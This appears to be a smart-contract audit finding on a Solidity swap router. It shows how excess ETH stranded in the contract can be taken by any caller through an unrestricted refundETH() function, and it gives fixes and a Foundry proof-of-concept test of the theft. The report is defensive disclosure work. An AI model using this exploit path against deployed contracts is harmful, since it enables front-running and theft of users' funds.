### Title
Excess Native ETH Sent to Payable Swap Functions Is Not Automatically Refunded and Can Be Stolen by Any Caller — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

The `pay` function in `PeripheryPayments.sol` wraps only the exact ETH amount owed to the pool when `token == WETH`, leaving any excess `msg.value` silently stranded in the router. Because `refundETH()` is a separate, permissionless call that sends the **entire** contract ETH balance to `msg.sender`, any third party can front-run the original caller and steal the stranded ETH. A second, compounding path exists: the partial-payment branch of `pay` silently consumes any pre-existing native balance to subsidise a later user's swap, permanently transferring the first user's ETH to the pool on behalf of someone else.

---

### Finding Description

**Root cause — `pay` in `PeripheryPayments.sol` lines 73–84:**

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();          // wraps exactly `value`
        IERC20(WETH).safeTransfer(recipient, value);   // excess stays in contract
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();  // consumes ALL leftover ETH
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

When `nativeBalance >= value`, only `value` wei is wrapped; the remainder (`nativeBalance - value`) is never returned to the caller. No automatic refund is issued anywhere in `exactOutputSingle`, `exactOutput`, `exactInputSingle`, or `exactInput`.

**Theft vector — `refundETH()` lines 58–63:**

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // sends to ANY caller, not original payer
    }
}
``` [2](#0-1) 

`refundETH()` is `external` with no access control and no record of who deposited the ETH. Any address that calls it after a victim's swap receives the full stranded balance.

**Compounding theft via partial-payment branch:**

If stranded ETH is still in the contract when a second user's WETH swap triggers `pay` with `0 < nativeBalance < value`, the function wraps **all** of the stranded ETH and credits it toward the second user's obligation, then pulls only the shortfall from the second user's ERC-20 allowance. The first user's ETH is permanently transferred to the pool on behalf of a stranger. [3](#0-2) 

**Affected entry points** — all are `payable` and call `pay` through the swap callback:

- `exactOutputSingle` — user must over-send ETH because the exact input is unknown until the pool executes.
- `exactOutput` — same; multi-hop exact-output compounds the uncertainty.
- `exactInputSingle` / `exactInput` — user may over-send ETH relative to `amountIn`. [4](#0-3) [5](#0-4) 

The intended safe pattern (shown in the test suite) is `multicall([exactOutputSingle(...), refundETH()])`, but this is not enforced at the contract level. [6](#0-5) 

---

### Impact Explanation

**Direct loss of user ETH principal.** A user who calls `exactOutputSingle` directly (not via `multicall`) with `msg.value = amountInMaximum` loses `msg.value − actualAmountIn` ETH to the first address that calls `refundETH()`. For exact-output swaps this over-send is the normal, expected usage pattern (the exact input is unknowable before execution), making the loss routine rather than exceptional. The compounding path additionally drains stranded ETH silently into a subsequent user's swap with no revert or event.

---

### Likelihood Explanation

**Moderate-to-high.** Exact-output swaps structurally require the caller to send more ETH than will be consumed. Any user who calls `exactOutputSingle` or `exactOutput` directly — rather than through a carefully constructed `multicall` bundle that appends `refundETH()` — will strand ETH. MEV searchers routinely monitor mempools for exactly this pattern (stranded ETH in permissionless refund functions) and will extract it within the same block.

---

### Recommendation

Two complementary fixes:

1. **Automatic refund at swap exit.** After each top-level swap function (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`) completes, check `address(this).balance` and, if non-zero, transfer it back to `msg.sender` before returning. This mirrors the fix recommended in the referenced external report.

2. **Restrict `refundETH` to the original payer.** Record the initiating `msg.sender` in transient storage at the start of each top-level call (alongside the existing callback context) and require `msg.sender == originalPayer` inside `refundETH()`, or make `refundETH` internal and call it automatically.

3. **Guard the partial-payment branch.** The `else if (nativeBalance > 0)` branch should only consume native balance that was deposited in the current call (tracked via transient storage), not any pre-existing balance left by a prior user.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
// Add to MetricOmmSimpleRouter.native.t.sol

function test_exactOutputSingle_excessEthStolenByThirdParty() public {
    // Attacker is a third party with no stake in the swap
    address attacker = makeAddr("attacker");

    uint128 amountOut = 1_500;
    // Quote the exact input needed
    (uint256 quotedIn,) =
        quoter.quoteHypotheticalExactOutputSingle(
            address(pool), true, amountOut, 0, TEST_BID_X64, TEST_ASK_X64
        );

    // Swapper sends 2x the quoted amount (normal over-send for exact-output)
    uint256 overpay = quotedIn * 2;
    vm.deal(swapper, overpay);

    uint256 swapperBefore = swapper.balance;
    uint256 attackerBefore = attacker.balance;

    // Swapper calls exactOutputSingle directly (no multicall + refundETH)
    vm.prank(swapper);
    router.exactOutputSingle{value: overpay}(
        IMetricOmmSimpleRouter.ExactOutputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountOut: amountOut,
            amountInMaximum: uint128(overpay),
            recipient: recipient,
            deadline: _deadline(),
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // Excess ETH is now stranded in the router
    uint256 stranded = address(router).balance;
    assertGt(stranded, 0, "ETH stranded in router");

    // Attacker front-runs and steals it
    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance - attackerBefore, stranded, "attacker stole excess ETH");
    assertEq(swapper.balance, swapperBefore - overpay, "swapper lost full overpay");
    assertEq(address(router).balance, 0, "router drained");
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L73-84)
```text
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L130-147)
```text
  function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    int128 expectedAmountOut = MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountOut);
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(params.recipient, params.zeroForOne, -expectedAmountOut, priceLimitX64, "", params.extensionData);
    int128 amountOut = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    if (amountOut != expectedAmountOut) revert InvalidOutputAmount(amountOut, params.amountOut);

    amountIn = MetricOmmSwapInputs.int128ToUint128(
      MetricOmmSwapResults.extractAmountIn(params.zeroForOne, amount0Delta, amount1Delta)
    );

    if (amountIn > params.amountInMaximum) revert InputTooHigh(amountIn, params.amountInMaximum);
    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L154-188)
```text
  function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn) {
    _checkDeadline(params.deadline);
    _validatePath(params.tokens, params.pools, params.extensionDatas);

    uint8 tradesLeftAfterThis = uint8(params.pools.length - 1);
    address pool = params.pools[tradesLeftAfterThis];
    bool zeroForOne = MetricOmmSwapPath.resolveZeroForOneBitmap(params.zeroForOneBitMap, tradesLeftAfterThis);
    int128 expectedAmountOut = MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountOut);
    _initCallbackContextforRecursiveOutput(
      pool, CALLBACK_MODE_EXACT_OUTPUT_ITERATE, tradesLeftAfterThis, msg.sender, params.tokens[0]
    );
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(pool)
      .swap(
        params.recipient,
        zeroForOne,
        -expectedAmountOut,
        MetricOmmSwapPath.openLimit(zeroForOne),
        abi.encode(
          ExactOutputIterateCallbackData({
          tokens: params.tokens,
          pools: params.pools,
          extensionDatas: params.extensionDatas,
          zeroForOneBitMap: params.zeroForOneBitMap,
          amountInMax: params.amountInMaximum
        })
        ),
        params.extensionDatas[tradesLeftAfterThis]
      );

    int128 amountOut = MetricOmmSwapResults.extractAmountOut(zeroForOne, amount0Delta, amount1Delta);
    if (amountOut != expectedAmountOut) revert InvalidOutputAmount(amountOut, params.amountOut);

    amountIn = _getExactOutputAmountIn();
    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.native.t.sol (L106-133)
```text
  function test_multicall_ethInput_exactInputSingle_refundsUnusedEth() public {
    uint128 amountIn = 1_000;
    uint256 msgValue = 2 ether;
    uint256 swapperEthBefore = swapper.balance;

    vm.prank(swapper);
    bytes[] memory calls = new bytes[](2);
    calls[0] = abi.encodeWithSelector(
      router.exactInputSingle.selector,
      IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(weth),
        tokenOut: address(token1),
        zeroForOne: true,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: recipient,
        deadline: _deadline(),
        priceLimitX64: 0,
        extensionData: ""
      })
    );
    calls[1] = abi.encodeWithSelector(router.refundETH.selector);
    router.multicall{value: msgValue}(calls);

    assertEq(swapper.balance, swapperEthBefore - amountIn, "unused eth refunded");
    _assertRouterEmpty();
  }
```
